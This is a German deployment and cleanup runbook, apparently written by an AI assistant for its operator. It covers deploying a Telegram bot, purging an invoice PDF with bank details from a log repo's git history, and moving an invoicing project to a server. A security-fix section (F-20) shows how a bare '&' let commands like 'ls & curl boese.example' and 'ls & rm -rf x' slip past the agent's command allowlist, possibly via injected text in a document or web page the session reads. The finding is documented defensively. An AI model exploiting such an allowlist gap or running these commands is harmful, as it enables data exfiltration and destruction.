<!-- ROLLE: befehlsbloecke-adam -->
> **Zweck: ANSICHT** · **Zu tun:** die Blöcke der Reihe nach ausführen — sie
> brauchen deine Hand, nicht root.

# Befehlsblöcke für Adam — was deine Hand braucht

> **Gültigkeits-Kopf** (Regel ⑪) · **Stichtag:** 04.09.2026 ·
> **Überholt durch:** — · **Maßgeblich** bleibt die Status-Zeile im Drehbuch.
>
> Server-Eingriffe löst Adam aus (8.7) — das ist keine Förmlichkeit: Der Bot
> darf sein eigenes Repo nie anfassen, sonst laufen Repo-Stand und laufender
> Code auseinander.
>
> Die Shell ist `zsh` — **keine `#`-Kommentarzeilen** in die Blöcke einfügen,
> zsh führt sie als Befehl aus. Erklärungen stehen deshalb außerhalb.
>
> Nach jedem Schritt steht eine Prüfzeile. Stimmt sie nicht: **aufhören und
> Bescheid sagen** — der Rückweg steht jeweils darunter.
>
> **Änderungshistorie**
> **04.09.2026** — Teil A neu: Deploy des Nachtblocks und Bereinigung des
> Log-Repos (Engywucks Befund 4, Adams Entscheid *„Historie bereinigen"*).
> **03.09.2026** — Teil B (Deploy 02.09. und Rechnungsumzug) ist **ausgeführt
> und erledigt**; er bleibt als Verlauf stehen, nicht als Aufgabe.

---

# Teil A · 04.09.2026 — Deploy und Log-Repo

## Schritt A1 — Deploy des Nachtblocks

**Seit deinem Neustart in der Nacht zum 03.09. ist nichts mehr ausgespielt
worden.** Dazugekommen sind die Freigabe-Erinnerungen, der deutsche
Freigabedialog, die drei Zusagen an Engywuck und der Ausschluss aus A2.

```bash
ssh claudebot 'cd ~/claude-telegram-bot && git pull --ff-only && bash scripts/regressionstest.sh 2>&1 | tail -3'
```

**Prüfzeile:** `== Ergebnis: 72/72 bestanden ==`. Weniger oder ein `❌`:
**nicht neu starten**, sondern die Ausgabe schicken.

```bash
ssh claudevps 'systemctl restart claude-telegram-bot && sleep 5 && systemctl is-active claude-telegram-bot'
```

**Prüfzeile:** `active`. Danach schreib dem Bot etwas — er soll antworten.

---

## Schritt A2 — Die Rechnungen aus dem Log-Repo nehmen

**Was gemessen wurde, nicht vermutet:** Im Log-Repo liegen unter
`ausarbeitungen/rechnungen/` drei Dateien — `README.md`,
`RECHNUNGSREGELN.md` und `output/Rechnung 012-26.pdf`. **Die PDF trägt eine
echte Bankverbindung** (nachgemessen, der Wert steht nirgends in einem
Bericht). Sie kam am 03.09. um 00:45 mit dem Vergleichslauf hinein, weil das
Rechnungsprojekt seit dem Umzug **im** abgeglichenen Arbeitsordner liegt.

**Die Reihenfolge ist die Funktion.** Wird die Historie vor dem Filter
umgeschrieben, bringt der nächste Abgleich die PDF in einer Stunde zurück.

### A2.1 — Zuerst der Filter (steckt schon in Schritt A1)

Der Ausschluss ist mit `bb37523` gebaut und geht mit A1 hinaus. **Nach dem
nächsten stündlichen Abgleich messen:**

```bash
ssh claudebot 'ls ~/logsync/claude-bot-logs/ausarbeitungen/ | head -20; echo "---"; ls ~/logsync/claude-bot-logs/ausarbeitungen/rechnungen 2>&1 | head -3'
```

**Prüfzeile:** Nach `---` muss *No such file or directory* stehen.

⚠️ **Eine Abweichung vom Nachtrag, und sie ist Absicht:** In der Quittung
`letzter-abgleich.txt` **erscheint `rechnungen/` weiterhin** — als eine
Sammelzeile *„ganzer Zweig zurueckgehalten"*. Ein lautloser Ausschluss wäre
die nächste Stille, die wie Ordnung aussieht. **Gemessen wird also am
Zielordner, nicht an der Quittung.**

### A2.2 — Die Dateien aus dem aktuellen Stand nehmen

```bash
ssh claudebot 'cd ~/logsync/claude-bot-logs && git rm -r --cached -q ausarbeitungen/rechnungen && rm -rf ausarbeitungen/rechnungen && git commit -q -m "Rechnungszweig entfernt (Befund 4)" && git push -q origin main && echo ENTFERNT'
```

**Prüfzeile:** `ENTFERNT`. Danach ist die Datei aus dem *aktuellen* Stand
weg — **aus der Historie noch nicht.** Dafür ist A2.3 da.

### A2.3 — Den Zeitgeber anhalten

**Das braucht root, also deine Hand.** Ohne diesen Schritt schiebt der
Abgleich mitten in das Umschreiben hinein.

```bash
ssh claudevps 'systemctl stop claude-log-sync.timer && systemctl is-active claude-log-sync.timer'
```

**Prüfzeile:** `inactive`.

### A2.4 — Die Historie umschreiben (Mac)

`git-filter-repo` fehlt hier noch. Es ist quelloffen und **kostenfrei**
(💰: keine Kostenquelle):

```bash
brew install git-filter-repo
```

Dann auf einem **frischen** Klon — `filter-repo` verlangt das und hat recht
damit, ein umgeschriebener Klon lässt sich nicht mehr sauber weiterverwenden:

```bash
cd /tmp && rm -rf logs-clean && git clone https://github.com/falkogorski/claude-bot-logs.git logs-clean && cd logs-clean && git filter-repo --path ausarbeitungen/rechnungen/ --invert-paths && git remote add origin https://github.com/falkogorski/claude-bot-logs.git && git push --force origin main && echo UMGESCHRIEBEN
```

**Warum `git remote add` mitten drin:** `filter-repo` **entfernt die
Gegenstelle absichtlich** — es will verhindern, dass jemand versehentlich eine
umgeschriebene Historie irgendwohin schiebt. Die Zeile setzt sie bewusst
zurück, direkt vor den einen Push, der gemeint ist.

**Prüfzeile:** `UMGESCHRIEBEN`, und danach:

```bash
cd /tmp/logs-clean && git log --all --oneline -- 'ausarbeitungen/rechnungen/' | wc -l
```

**Prüfzeile:** `0`.

### A2.5 — Alle Klone nachziehen

**Ein Klon mit alter Historie, der einmal pusht, macht alles rückgängig.**
Es sind zwei bekannte — der Abgleichsklon auf dem VPS und deiner am Mac:

```bash
ssh claudebot 'cd ~/logsync/claude-bot-logs && git fetch -q origin && git reset --hard -q origin/main && echo VPS-KLON-NACHGEZOGEN'
git -C ~/Projects/claude-bot-logs fetch -q origin && git -C ~/Projects/claude-bot-logs reset --hard -q origin/main && echo MAC-KLON-NACHGEZOGEN
```

**Prüfzeile:** beide Meldungen. **Kennst du einen dritten Klon** — auf einem
anderen Rechner, in einem alten Ordner —, sag Bescheid, bevor A2.6 läuft.

### A2.6 — Zeitgeber wieder starten und messen

```bash
ssh claudevps 'systemctl start claude-log-sync.timer && systemctl start claude-log-sync.service && sleep 20 && systemctl is-active claude-log-sync.timer'
```

**Prüfzeile:** `active`, und danach ein letzter Blick:

```bash
ssh claudebot 'ls ~/logsync/claude-bot-logs/ausarbeitungen/rechnungen 2>&1 | head -2'
```

**Prüfzeile:** *No such file or directory* — der Zweig kommt nicht zurück.

**Was du wissen sollst, ohne Beschönigung:** GitHub hält überschriebene
Objekte eine Weile in seinem Zwischenspeicher. Für ein **privates** Repo ohne
Fremdzugriff ist das tragbar. Wer mehr will, bittet den GitHub-Support um
eine Bereinigung — das ist deine Entscheidung, kein Automatismus.

**Noch etwas, das beim Messen auffiel und nicht in A2 gehört:** Zwei Papiere
liegen **außerhalb** des Zweigs und beschreiben dieselbe Rechnung —
`2026-09-02_rechnung-norderney-livesetup.md` und `.pdf`. Sie enthalten
**keine** Bankverbindung und keine Steuernummer (nachgemessen), wohl aber
Kunde und Beträge. Der Ordner-Ausschluss greift dort nicht. **Das ist keine
Empfehlung, sondern eine Beobachtung** — sag, ob solche Papiere im Log-Repo
liegen dürfen; sie sind der Weg, auf dem Engywuck deine Vorgänge überhaupt
lesen kann.

---

# Teil B · 02.09.2026 — erledigt am 03.09.

> **Ausgeführt und abgeschlossen.** Deploy, Umzug, `typst` und der
> Vergleichslauf sind durch; das Rechnungsprojekt liegt auf dem Server und hat
> die Rechnung 017-26 dort erzeugt. Der Abschnitt bleibt als **Verlauf**
> stehen — Zwischenschritte werden archiviert, nicht geglättet.

## Warum der Deploy an jenem Tag der wichtigste einzelne Handgriff war

**Alles, was du heute verlangt hast, ist gebaut. Nichts davon läuft.** Der VPS
steht auf dem Stand vom 29.08.; seither sind die Genehmigungs-Umschaltung, die
Bash-Zerlegung, die curl-Sperre und alles von heute dazugekommen. Deine Frage
*„Ich habe gerade keinen richtigen Durchblick mehr von dem, was alles gebaut
wird"* hat genau diesen Grund — und sie beantwortet sich mit Schritt 1, nicht
mit einer Erklärung.

**Es ist die Lehre vom 29.07. zum zweiten Mal:** Damals lag ein fertiger Fix
ungedeployt, und die Wache, die es hätte melden können, sah den Branch nicht.

**`requirements.txt` ist seit dem 29.08. unverändert** — kein pip-Schritt, kein
venv-Block. Der Deploy ist `git pull` und Neustart.

### ⚠️ Seit heute Nachmittag ist ein Sicherheits-Fix dabei

Beim Aufräumen gefunden und am selben Tag behoben (**F-20**): Ein Befehl mit
einem freistehenden `&` umging die **gesamte** Positivliste.

```
ls & curl boese.example   →  lief FREI, ohne Rückfrage
ls & rm -rf x             →  lief FREI, ohne Rückfrage
```

Der Grund: Die Prüfung sah nur das erste Verb (`ls`, erlaubt) und übersprang
den Rest, weil dort kein Schrägstrich stand — **die Shell führte trotzdem
beides aus.** Das galt in **jedem** Modus, auch im Genehmigen-Zustand, und es
war **vorbestehend**, nicht neu: gegen den Stand vom 29.08. gemessen, dort
ebenso offen. **Auf dem laufenden Server ist diese Lücke also gerade offen.**

Kein Hinweis darauf, dass sie je genutzt wurde — der Angriffsweg wäre ein
Dokument oder eine Webseite, die die Sitzung liest. **Das ist der Grund, warum
der Deploy heute nicht bis morgen warten sollte.**

---

## Schritt 1 — Deploy

```bash
ssh claudebot 'cd ~/claude-telegram-bot && git pull --ff-only && bash scripts/regressionstest.sh 2>&1 | tail -5'
```

**Prüfzeile:** Am Ende muss `== Ergebnis: 70/70 bestanden ==` stehen. Steht dort
eine kleinere Zahl oder ein `❌`: **nicht neu starten**, sondern die Ausgabe
schicken. Ein roter Lauf auf dem Server ist genau der Fall, für den er da ist.

Danach der Neustart:

```bash
ssh claudevps 'systemctl restart claude-telegram-bot && sleep 5 && systemctl is-active claude-telegram-bot'
```

**Prüfzeile:** `active`. Danach schreib dem Bot irgendetwas — er soll antworten.

**Rückweg**, falls etwas hakt: `git -C ~/claude-telegram-bot reset --hard 5d2590d`
auf dem Server, dann Neustart. Das ist der Stand vom 29.08., der heute läuft.

**Was du nach dem Deploy sofort siehst:** Auf der Haupttastatur liegt ein neuer
Knopf **„🔐 Genehmigen ✓ → Auto"**. Er schaltet den Auto-Zustand ein, in dem
Lese- und Bauaufträge ohne Rückfrage laufen — Websuche, Schreibrechte,
Geheimnisse und der Weg nach außen bleiben im Dialog. **Der Zustand bleibt über
Neustarts erhalten**, und derselbe Knopf schaltet zurück.

---

## Schritt 2 — Das Rechnungsprojekt zieht auf den Server

**Nichts wird nachgebaut, das Bestehende zieht um.** Vom Mac aus, damit du
nichts kopieren musst:

```bash
rsync -az --exclude '.venv' --exclude '__pycache__' --exclude 'output' ~/Projects/rechnungen/ claudebot:~/workspace/rechnungen/
```

**Warum `~/workspace/` und nicht `~/rechnungen/`:** Es gibt auf dem Server genau
vier Bereiche, in denen Befehle ohne Rückfrage laufen. `~/rechnungen` liegt in
keinem — jeder Generator-Aufruf dorthin fiele in den Dialog, also genau die
Rückfragen, die du heute abgestellt haben willst. `~/workspace` ist schreibbar.
**Kein neuer Bereich, keine Codeänderung.**

`.venv` und `output` bleiben absichtlich hier: Die virtuelle Umgebung ist an den
Mac gebunden (65 MB), und `output` ist Erzeugtes, kein Quellmaterial.

**Prüfzeile:**

```bash
ssh claudebot 'ls ~/workspace/rechnungen/ ~/workspace/rechnungen/daten/ | head -30'
```

Es müssen `scripts/`, `templates/`, `daten/`, `assets/` da sein und in `daten/`
unter anderem `stammdaten.json`, `saetze.json`, `rechnungsnummern.json`.

**Die Stammdaten sind ab dem Deploy geschützt:** `stammdaten` steht seit heute
in der Geheimnis-Liste. Wer die Datei in einem Befehl **nennt** (`cat`, `grep`),
bekommt eine Rückfrage; der Generator nennt sie nicht und läuft durch — er liest
sie selbst. Der Riegel kommt **vor** dem Umzug, nicht danach.

---

## Schritt 3 — `typst` auf den Server, ohne root

`typst` steht bereits in der Positivliste; es fehlt nur auf dem Server. Es ist
eine einzelne statische Binärdatei, quelloffen, **kostenfrei**, wenige
Megabyte.

```bash
ssh claudebot 'mkdir -p ~/.local/bin && cd /tmp && curl -fsSL https://github.com/typst/typst/releases/latest/download/typst-x86_64-unknown-linux-musl.tar.xz -o typst.tar.xz && tar -xf typst.tar.xz && mv typst-x86_64-unknown-linux-musl/typst ~/.local/bin/ && rm -rf typst.tar.xz typst-x86_64-unknown-linux-musl && ~/.local/bin/typst --version'
```

**Prüfzeile:** eine Versionsnummer, etwa `typst 0.x.y`.

**Nach `~/.local/bin`, nicht `/usr/local/bin`** — kein root nötig.

**Und die Falle, die geprüft gehört, nicht angenommen:** Der Bot läuft als
systemd-Dienst. Enthält dessen `PATH` das Verzeichnis nicht, sagt die
Positivliste ja und die Shell *command not found*. Das ist die Klasse *am Mac
lief alles* vom 29.07.

```bash
ssh claudevps 'systemctl show claude-telegram-bot -p Environment | grep -o "PATH=[^ ]*" || echo "kein PATH gesetzt -- erbt den Standard"'
```

Steht `~/.local/bin` bzw. `/home/claudebot/.local/bin` **nicht** darin: sag
Bescheid. Dann trage ich den absoluten Pfad in den Generator ein — das ist eine
Zeile und braucht keinen Dienst-Eingriff.

---

## Schritt 4 — Der Vergleichslauf, und er ist der wichtigste

**Ohne ihn weiß niemand, ob die Schriften auf dem Server dasselbe Bild
ergeben** — das ist Claudias Satz und der wichtigste in ihrem Papier.

Erzeuge eine **bestehende** Rechnung auf dem Server neu und halte sie gegen die
Mac-Fassung:

```bash
ssh claudebot 'cd ~/workspace/rechnungen && mkdir -p output ausgang && python3 scripts/generate_rechnung.py daten/rechnung_012-26.json && ls -la output/'
```

Dann herunterholen und ansehen:

```bash
rsync -az claudebot:~/workspace/rechnungen/output/ ~/Downloads/rechnung-servertest/ && open ~/Downloads/rechnung-servertest/
```

**Prüfzeile:** Die PDF sieht aus wie die vom Mac — Logo, Unterschrift,
Schriftbild, Beträge. **Weicht das Schriftbild ab, hör hier auf:** Dann fehlen
auf dem Server Schriften, und das ist eine eigene Sache, keine Kleinigkeit.

**Danach aufräumen — Claudias Provisorium darf keine zweite Wahrheit werden:**

```bash
ssh claudebot 'ls ~/rechnungen-uebergang 2>/dev/null && echo "^ das kann weg, wenn der Vergleichslauf stimmt"'
```

Löschen erst nach deinem Blick darauf, und erst wenn Schritt 4 stimmt.

---

## Was danach läuft, ohne dass du etwas tust

Sobald fertige Rechnungen in `~/workspace/rechnungen/ausgang/` liegen, holt
`scripts/mac/rechnungen_ablegen.sh` sie **beim nächsten Sitzungsstart** ab und
legt sie in iCloud ab.

**Ehrlich zur Geschwindigkeit:** Das geschieht beim Sitzungsstart oder auf
Zuruf — **nicht** Minuten nach dem Erzeugen. Für eine Rechnung, die am selben
Tag rausgeht, reicht das; ein nächtlicher Lauf ohne Sitzung legt nichts ab.
**Genau deshalb hast du „später B" gesagt, und das bleibt richtig.**

**Eine Frage, die ich nicht raten wollte:** Der Zielordner in iCloud ist
zunächst `Business/Deko/DEKO-Service/_Aus-dem-Server` — ein **Übergabeordner**,
kein Ablageort. Es gibt in iCloud keinen Rechnungsordner, sondern deine
gewachsene Kundenstruktur, und der Generator kennt kein Einsortier-Schema. Ich
stelle deshalb zu und sortiere nicht ein. **Sag mir, wohin die Dateien
sollen** — dann trage ich es fest ein.
